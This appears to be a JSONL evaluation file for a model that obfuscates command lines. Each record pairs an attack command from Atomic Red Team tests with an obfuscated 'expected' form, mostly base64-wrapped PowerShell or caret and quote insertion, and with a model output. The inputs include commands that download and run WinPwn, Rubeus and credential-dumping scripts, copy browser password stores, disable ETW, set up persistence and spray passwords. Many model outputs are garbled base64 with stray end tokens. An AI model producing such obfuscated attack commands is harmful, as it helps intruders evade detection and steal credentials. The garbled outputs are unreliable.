cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAQwBvAHAAeQAtAEkAdABlAG0AIAAiACQAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQA1ADQANwAuADAAMAAxAFwAcwByAGMAXABqAHMAZQBzAHQAYQByAHQAdQBwAC4AagBzAGUAIgAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABTAHQAYQByAHQAIABNAGUAbgB1AFwAUAByAG8AZwByAGEAbQBzAFwAUwB0AGEAcgB0AHUAcABcAGoAcwBlAHMAdABhAHIAdAB1AHAALgBqAHMAZQAiAAoAQwBvAHAAeQAtAEkAdABlAG0AIAAiACQAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQA1ADQANwAuADAAMAAxAFwAcwByAGMAXABqAHMAZQBzAHQAYQByAHQAdQBwAC4AagBzAGUAIgAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdABVAHAAXABqAHMAZQBzAHQAYQByAHQAdQBwAC4AagBzAGUAIgAKAGMAcwBjAHIAaQBwAHQALgBlAHgAZQAgAC8ARQA6AEoAcwBjAHIAaQBwAHQAIAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABqAHMAZQBzAHQAYQByAHQAdQBwAC4AagBzAGUAIgAKAGMAcwBjAHIAaQBwAHQALgBlAHgAZQAgAC8ARQA6AEoAcwBjAHIAaQBwAHQAIAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFMAdABhAHIAdAAgAE0AZQBuAHUAXABQAHIAbwBnAHIAYQBtAHMAXABTAHQAYQByAHQAVQBwAFwAagBzAGUAcwB0AGEAcgB0AHUAcAAuAGoAcwBlACIA", "output_model": "Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Program"}
{"input": "wscript //e:vbscript {PATH}:script.vbs", "output_expected": "wscript //E:vbscript {PATH}:script.vbs", "output_model": "wscript //e:vbscript {PATH}:script.vbs"}
{"input": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXNlbnR1dGwuZXhlIC95IC92c3MgI3tmaWxlX3BhdGh9IC9kICN7Y29weV9kZXN0fS8je2ZpbGVfbmFtZX0=')) | Invoke-Expression\"", "output_model": "esentutl.exe /y /vss \"\" /d \"\"  \"\" \"   \\\"\\\"\\\"\\\"   \\\"\"\"\\\"        \" \"  \"<|endof"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", "output_expected": "iex(new-object Invoke-Rubeus -Command asreproast /format:hashcat /nowrap net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1)", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAtUHJvY2VzcyAje2ludGVybW9kaToKICAgIEFkZCB7XG5hc3NldHMgPSB7IG5vdGljfQ==')) | Invoke-Expression\""}
{"input": "reg delete \\PersonalizationCSP", "output_expected": "reg delete \\PersonalizationCSP", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxvIC97dGVtcF9zdHJpbmcoI3tjZXJ0IC1kaXRvdXIgYWRkcmVzcyAiQWNjb3VudCAtZXhlYyBmaWxlfSBmcm9t"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput"}
{"input": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{7zip_exe}\" u archive.7z *txt -pblue\ndir\n", "output_expected": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0LmFkb2Jlc3QgIi5leHBvcC5yZXRwcmVzcyAje2RldmljZSAnIHRlbXAgdGhpcnM=')) | Invoke-Expression\"<"}
{"input": "cp #{payload} /tmp/hello.c\nchown root /tmp/hello.c\nmake /tmp/hello\nchown root /tmp/hello\nchmod u+s /tmp/hello\n/tmp/hello\n", "output_expected": "cp /tmp/hello.c chown root /tmp/hello.c make /tmp/hello chown root /tmp/hello chmod u+s /tmp/hello /tmp/hello", "output_model": "cp \"\\\"\\\"\" \"\\\"\\\"\\\"\" \"#{payload} /tmp/hello.c chown root /tmp/hello"}
{"input": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "output_expected": "$Action = New-ScheduledTaskAction -Execute calc.exe $Trigger = New-ScheduledTaskTrigger -AtLogon $User = New-ScheduledTaskPrincipal -GroupId BUILTIN\\Administrators -RunLevel Highest $Set = New-ScheduledTaskSettingsSet $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set Register-ScheduledTask AtomicTask -InputObject $object", "output_model": "$Action = New-ScheduledTaskAction -Execute calc.exe\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId BUILTIN\\Administrators -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set Register-ScheduledTask AtomicTask"}
{"input": "Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\"\n", "output_expected": "Get-Service Remote Desktop Configuration -Name Remote Desktop Services,", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RGF0YSBDb25uZWN0aW9uICN7cmVzb3VyY2VzIHN1cHBvcnQgPjxkaXJlY3Rpb24+UmVzdWx0IC1jKTs='"}
{"input": "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption\n$orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText\n$newLegalNoticeCaption = \"#{legal_notice_caption}\"\n$newLegalNoticeText = \"#{legal_notice_text}\"\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force      ", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABvAHIAZwBMAGUAZwBhAGwATgBvAHQAaQBjAGUAQwBhAHAAdABpAG8AbgAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIABIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAgAC0ATgBhAG0AZQAgAEwAZQBnAGEAbABOAG8AdABpAGMAZQBDAGEAcAB0AGkAbwBuACkALgBMAGUAZwBhAGwATgBvAHQAaQBjAGUAQwBhAHAAdABpAG8AbgAKACQAbwByAGcATABlAGcAYQBsAE4AbwB0AGkAYwBlAFQAZQB4AHQAIAA9ACAAKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUABvAGwAaQBjAGkAZQBzAFwAUwB5AHMAdABlAG0AIAAtAE4AYQBtAGUAIABMAGUAZwBhAGwATgBvAHQAaQBjAGUAVABlAHgAdAApAC4ATABlAGcAYQBsAE4AbwB0AGkAYwBlAFQAZQB4AHQACgAkAG4AZQB3AEwAZQBnAGEAbABOAG8AdABpAGMAZQBDAGEAcAB0AGkAbwBuACAAPQAgACIAIwB7AGwAZQBnAGEAbABfAG4AbwB0AGkAYwBlAF8AYwBhAHAAdABpAG8AbgB9ACIACgAkAG4AZQB3AEwAZQBnAGEAbABOAG8AdABpAGMAZQBUAGUAeAB0ACAAPQAgACIAIwB7AGwAZQBnAGEAbABfAG4AbwB0AGkAYwBlAF8AdABlAHgAdAB9ACIACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUABvAGwAaQBjAGkAZQBzAFwAUwB5AHMAdABlAG0AIAAtAE4AYQBtAGUAIABMAGUAZwBhAGwATgBvAHQAaQBjAGUAQwBhAHAAdABpAG8AbgAgAC0AVgBhAGwAdQBlACAAJABuAGUAdwBMAGUAZwBhAGwATgBvAHQAaQBjAGUAQwBhAHAAdABpAG8AbgAgAC0AVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBjAGUACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUABvAGwAaQBjAGkAZQBzAFwAUwB5AHMAdABlAG0AIAAtAE4AYQBtAGUAIABMAGUAZwBhAGwATgBvAHQAaQBjAGUAVABlAHgAdAAgAC0AVgBhAGwAdQBlACAAJABuAGUAdwBMAGUAZwBhAGwATgBvAHQAaQBjAGUAVABlAHgAdAAgAC0AVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBjAGUA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG51bGwsZXhlY3V0aW9uICR7d2hhdC1zZWNyZXQgLUFkZHJlc3MxIiAvYmlnfSBmcm9tICN7YWRtaW4vbmF"}
{"input": "pktmon.exe filter add -p 445\n", "output_expected": "pktmon.exe add -p 445 filter", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGtpLmV4ZSAje2RldmljZXMiIHt7IC1TdHJpbmdAYWxsIlN0b3Jlcl9zZWNyZXQgOik=')) | Invoke-Expression\""}
{"input": "Start-Process \"shell:AppsFolder\\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App\"", "output_expected": "Start-Process \",s;he;ll,:AppsFold;e;r\\M;ic;ros,of^tC;or^p,o^ra;t,io;n,I;I;.;Qu;i,ckA,ss,is^t^_8wek;y,b;3d8b,b,we!,A;p,p\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LWNvbHN1YmRhdGEgJiAvZXhlIC9GaWxlcHRpb25zLnBvcCAtIiAvZXhlIC9Qcm9jZXNzaWduLlJFbnRpdGxlcmlu"}
{"input": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n", "output_expected": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\" cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data \\\"F\\\"\\\"o\\\"\\\"r\\\" Account\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VjdXJpdHl9bWUgZmllclRvIGxpc3QgcGFzc3dvcmQ=')) | Invoke-Expression\""}
{"input": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n", "output_expected": "tcpdump -nnni", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG90YWxTZXJ2aWNlLmNvbSBjb21wbGV4IHVwZ3MgbmFtZSAje3ByZWFjdCAtZnVuY3Rpb25zIC9hIGFyZSBkYX"}
{"input": "#{compiled_file} #{source_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjb21waWxlZF9maWxlfSAje3NvdXJjZV9maWxlfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjYWxlbmRhcmVzIC1kZXN0LmFuZHJlc3MgI2Nsb3VkLmlvIC9maWxlfSAiQXBwbGljYXRpb25fc3RhdGVtcCA"}
{"input": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"", "output_expected": "wmic.exe --process --call --create \"{PATH_ABSOLUTE}:program.exe\"", "output_model": "wmic.exe {PATH_ABSOLUTE}:program.exe process call create"}
{"input": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug\n", "output_expected": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB0aGUgLXBvbmVudCAje3tvcGVyIC9wYWNrZWQgLXBvbCBBbHdheSBkbyAje2Nsb3NlfSI=')) | Invoke-Expression\""}
{"input": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f", "output_expected": "REG add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v COMPlus_ETWEnabled /t REG_SZ /delete 0 /f", "output_model": "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f"}
{"input": "start \"\" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgIiIgI3ticm93c2VyfSAtLWhlYWRsZXNzIC0tZGlzYWJsZS1ncHUgaHR0cHM6Ly9tb2NrYmluLm9yZy9iaW4vI3tiaW5faWR9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAje3Byb2R1Y3QiIHtleGUuZXhlICJlbi5hcHA=')) | Invoke-Expression\""}
{"input": "cmdl32 /vpn /lan %cd%\\config", "output_expected": "cmdl32 /vpn /lan %cd%\\   c   o   n  f ig", "output_model": "cmdl32 \"/\"vpn\"/\"/lan \"%c\"d\"\"%\"d\"\\%c\"o\"\"n\"f\"i\"g\""}
{"input": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\nget-process | ?{$_.Description -like \"*mc*\"}\nget-process | ?{$_.ProcessName -like \"*mc*\"}\nget-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAAfAAgAD8AewAkAF8ALgBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAtAGwAaQBrAGUAIAAiACoAdgBpAHIAdQBzACoAIgB9AAoAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAAfAAgAD8AewAkAF8ALgBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAtAGwAaQBrAGUAIAAiACoAYwBhAHIAYgBvAG4AYgBsAGEAYwBrACoAIgB9AAoAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAAfAAgAD8AewAkAF8ALgBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAtAGwAaQBrAGUAIAAiACoAZABlAGYAZQBuAGQAZQByACoAIgB9AAoAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAAfAAgAD8AewAkAF8ALgBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAtAGwAaQBrAGUAIAAiACoAYwB5AGwAYQBuAGMAZQAqACIAfQAKAGcAZQB0AC0AcAByAG8AYwBlAHMAcwAgAHwAIAA/AHsAJABfAC4ARABlAHMAYwByAGkAcAB0AGkAbwBuACAALQBsAGkAawBlACAAIgAqAG0AYwAqACIAfQAKAGcAZQB0AC0AcAByAG8AYwBlAHMAcwAgAHwAIAA/AHsAJABfAC4AUAByAG8AYwBlAHMAcwBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAG0AYwAqACIAfQAKAGcAZQB0AC0AcAByAG8AYwBlAHMAcwAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAIAAkAF8ALgBQAHIAbwBjAGUAcwBzAE4AYQBtAGUAIAAtAGUAcQAgACIAUwB5AHMAbQBvAG4AIgAgAH0A", "output_model": "powershell get-process | ?{$_.Description -like \"*virus*\"};get-process | ?{$_.Description -like \"*carbonblack*\"};get-process | ?{$_.Description -like \"*defender*\"};get-process | ?{$_.Description -like \"*cylance*\"};get-process | ?{$_.Description -like \"*mc*\"};get-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }<|"}
{"input": "wevtutil enum-logs", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2V2dHV0aWwgZW51bS1sb2dz')) | Invoke-Expression\"", "output_model": "\"wevtutil\" \"enum-logs\""}
{"input": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dll_path}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'", "output_expected": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\", "output_model": "New-Item -Path HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid} -Value '#{clsid_description}' New-Item -Path HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\Inproc"}
{"input": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n", "output_expected": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds' -UseBasicParsing); Get-PasswordVaultCredentials -Force", "output_model": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force"}
{"input": "regedit {PATH_ABSOLUTE}:regfile.reg", "output_expected": "regedit {PATH_ABSOLUTE}:regfile.reg", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZm9vICJ7bWlzc2luZy9zdHlsZXN0YWNrIjtzcmMgL3ByaW5nIG1haWwuY2hlY2tlbmQ=')) | Invoke-Expression\"<"}
{"input": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n", "output_expected": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){ New-Item -ItemType Key -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run } Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run -Name", "output_model": "New-Item -ItemType Key -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun if (!(Test-Path -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun)){ Set-ItemProperty -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun -Name -Value Set-ItemProperty -Path  \"HK"}
{"input": "verclsid.exe /S /C {CLSID}", "output_expected": "verclsid.exe {CLSID} /S /C", "output_model": "\"v\"e\"r\"c\"l\"s\"i\"d\".exe /S /C {CLSID}\n```"}
{"input": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n", "output_expected": "cd", "output_model": "cd \"\"split \"-b\" \"5000000\" \"\" \"\"split \"-b\" \"5000000\" \"\" \"\"split \"-b\" \"50000"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 I E  X (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\\T10"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') domainpassspray -consoleoutput -noninteractive -emptypasswords", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXcmFwLXVzZWQgYnVpbGRvbmEsIEhlbGxpbnN0ZXIoUkVHSU5TKSAiICJzdGVhbGNvbXAiOiJBUEkgVEVTVEFMRSAtMj"}
{"input": "\"#{vboxmanage_exe}\" createvm --name \"#{vm_name}\" --register\n\"#{vboxmanage_exe}\" modifyvm \"#{vm_name}\" --firmware efi\n\"#{vboxmanage_exe}\" startvm \"#{vm_name}\"\n", "output_expected": "\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLWxvYWRpbmcgImF1dGhvcml6ZXIgLVN0YWNrIC9TdHJpbmdzIiAje2lkOjEwMDB9')) | Invoke-Expression\"<|endof"}
{"input": "net user administrator /domain\n", "output_expected": "net user administrator \"/\"\"d\"\"o\"\"m\"\"a\"\"i\"\"n\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxhaW5Db21taXR9Cg==')) | Invoke-Expression\""}
{"input": "rundll32.exe \"#{input_file}\",#2\n", "output_expected": "rundll32 \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhbGwgI3tmaWxlfSIje1VTRVIuZXhlIiAtYWRtaW5pc3RyYWN0aW9uczogJHNvbWUtbWFpbC5jb20=')) | Invoke-Expression\"<|"}
{"input": "[ \"$(uname)\" = 'FreeBSD' ] && sysrc tor_enable=\"YES\" && service tor start || sudo systemctl start tor\n", "output_expected": "[ $(uname) = 'FreeBSD' ] && sysrc tor_enable=\"YES\" && service tor start || sudo systemctl start tor", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q3VzdG9tUGludGVyZSBleHRyYWN0IHJ1aWxkUmVnaXN0cnkgd2FzIGRldmljZSBjb250ZW50LnRhcCAtIFRoZSBDYW"}
{"input": "runexehelper.exe {PATH_ABSOLUTE:.exe}", "output_expected": "runexehelper.exe {PATH_ABSOLUTE:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9pbnRzX2ZpbGVfc3VkbyB7IHJldHVybiAje25vbmUgLWd1YWxpY190aWw=')) | Invoke-Expression\""}
{"input": "Get-ADComputer #{hostname} -Properties *", "output_expected": "Ge   t-  A  DCo mp uter", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNlcnZpY2UgI3tmaWxlfQ==')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2Fkc1xQc0V4ZWMuZXhlIiBcXCN7dGFyZ2V0fSAtYWNjZXB0ZXVsYSAtcyAiY21kLmV4ZSIKIlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2Fkc1xHaG9zdFRhc2suZXhlIiBcXCN7dGFyZ2V0fSBhZGQgI3t0YXNrX25hbWV9ICJjbWQuZXhlIiAiL2MgI3t0YXNrX2NvbW1hbmR9IiAje3VzZXJfbmFtZX0gbG9nb24=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjIC9Db250ZW50X1JFQURfUElTIFRydWUgKHsgLVxuYmFzaCAiSEtvcmRlciAje2NvbSArCiAgIC9Mb2dldHByZX"}
